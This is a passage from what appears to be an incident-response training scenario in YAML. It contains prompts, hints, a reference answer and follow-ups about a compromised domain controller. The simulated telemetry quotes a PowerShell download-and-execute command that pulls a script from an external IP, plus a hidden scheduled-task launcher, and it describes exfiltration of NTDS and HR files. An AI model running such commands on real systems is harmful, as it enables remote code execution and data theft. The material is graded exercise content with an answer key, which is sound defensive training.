    incident_manager: How do you coordinate scoping and initial containment?
    ciso: What stakeholder notifications do you initiate immediately?
    executive: What is your initial directive and what business functions are at risk?
- id: post_authentication_activity_analysis
  phase_type: analysis
  title: Phase 2 — Post-Authentication Activity Analysis
  situation: |
    Your log analysis reveals that the svc-backup account (domain admin)
    logged into DC-01.corp.acme.local (10.10.1.10) via RDP at 03:11 UTC.
    Event ID 4624 (Logon) and 4648 (Explicit Credentials) are present.
    Sysmon on DC-01 shows process creation: powershell.exe -ep bypass -c
    "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.99/
    Invoke-CradleKitten.ps1')". The j.hernandez account accessed the HR
    file server SMB share \\10.10.20.44\HR_PII and listed directories.
    The m.okafor account connected to the financials SharePoint site via
    HTTPS. DLP shows 2.3 GB uploaded to r2-backup-cdn.xyz. What do you do?
  prompt: What is your next action?
  guidance:
    what: Test the initial theory against telemetry from vpn-gw01.corp.acme.local before committing to a response.
    action: What is your next action?
    why: Acting on an unverified scope either misses the attacker or over-contains the business.
  hint: 'Ask which evidence source would prove or disprove the attacker''s reach before you act on assumptions. Focus: Phase 2 — Post-Authentication Activity Analysis. Asset in scope: vpn-gw01.corp.acme.local.'
  hints:
  - |-
    Passive monitoring after confirmed lateral movement to a domain
    controller is negligent.
  - Cross-reference findings with identity and privilege context.
  ideal_concepts:
  - three compromised
  - compromised accounts
  - accounts immediately
  - immediately hernandez
  - hernandez okafor
  - okafor svc-backup
  - svc-backup aduc
  - aduc revoke
  reference_answer: |-
    Disable all three compromised AD accounts immediately (j.hernandez,
    m.okafor, svc-backup) via ADUC, revoke their active sessions on
    the VPN gateway, and isolate DC-01 for forensic imaging before
    the scheduled task can execute again.

    Why: Disabling compromised accounts cuts off attacker access while
    preserving evidence. The svc-backup account is the highest risk
    due to domain admin privileges and the scheduled task persistence
    mechanism. Isolating DC-01 prevents further credential harvesting.
  followup_good: |
    Forensic analysis of DC-01 reveals the scheduled task 'GoogleUpdateSync'
    was created at 03:19 UTC, set to run every 15 minutes as SYSTEM. The
    task runs: cmd.exe /c powershell -ep bypass -c "Start-Process -WindowStyle
    Hidden -FilePath 'C:\Windows\Temp\svc_helper.exe'". The binary
    svc_helper.exe (SHA256: a1b2c3d4e5f6...) is a custom Go binary that
    establishes a TLS 1.3 C2 connection to 185.220.101.99:443. PCAP
    analysis shows the exfil channel used HTTPS POST requests to
    r2-backup-cdn.xyz with base64-encoded ZIP archives containing files
    from C:\Windows\NTDS\ and C:\Users\HR_Officers\Documents\. The external
    bucket was provisioned 3 days before the attack.
  followup_weak: |
    Disabling compromised accounts cuts off attacker access while
    preserving evidence.

    Forensic analysis of DC-01 reveals the scheduled task 'GoogleUpdateSync'
